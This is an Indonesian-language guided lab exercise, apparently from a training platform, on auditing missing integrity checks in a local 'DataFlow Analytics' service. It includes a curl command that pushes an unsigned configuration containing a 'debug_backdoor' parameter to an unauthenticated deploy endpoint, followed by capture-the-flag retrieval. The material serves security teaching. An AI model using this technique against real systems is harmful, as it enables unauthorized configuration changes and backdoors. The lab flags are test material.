# Panduan Praktik Terbimbing: Audit Kegagalan Integritas pada DataFlow Analytics

Dalam latihan terarah ini, Anda akan mempraktikkan proses pembuktian kegagalan verifikasi integritas data pada mesin pemrosesan data **DataFlow Analytics (Enterprise BI & Data Processing Engine)** pada `http://127.0.0.1:8018`.

---

### Tahap 1: Analisis Konfigurasi Kluster Aktif
1. Buka peramban web dan akses konsol DataFlow Analytics:
   `http://127.0.0.1:8018/`
2. Perhatikan kartu **Active Streaming Engine Configuration**:
   - Menampilkan konfigurasi default yang sah:
     - `version: "1.0.0"`
     - `signature_verified: true`
     - `signer: "dataflow-root-authority"`
3. Periksa respons JSON langsung dari endpoint:
   `http://127.0.0.1:8018/api/config`

---

### Tahap 2: Pengujian Endpoint Deployment Konfigurasi
1. Amati endpoint penerima pembaruan konfigurasi:
   `POST /api/deploy_update`
2. Perhatikan bahwa endpoint ini tidak meminta sertifikat klien, tanda tangan HMAC, atau token otorisasi asimetris.

---

### Tahap 3: Deployment Konfigurasi yang Dimodifikasi & Eksfiltrasi
1. Gunakan terminal Zitera Lab untuk mengirimkan paket konfigurasi tidak bertanda tangan dengan parameter modifikasi:
   ```bash
   curl -X POST http://127.0.0.1:8018/api/deploy_update \
     -H "Content-Type: application/json" \
     -d '{"version": "2.0.0", "signature_verified": false, "signer": "external-adversary", "params": {"debug_backdoor": true}}'
   ```
2. **Temuan Kritis:**
   - Server mengembalikan status `applied`:
     ```json
     {
       "status": "applied",
       "message": "Configuration package deployed directly into cluster memory.",
       "flag": "ZITERA{...}"
     }
     ```
   - Kluster memuat konfigurasi palsu secara langsung tanpa penolakan kriptografis!
3. Salin bukti flag berformat `ZITERA{...}` dan kirimkan ke Zitera Lab desktop untuk menyelesaikan modul ini.
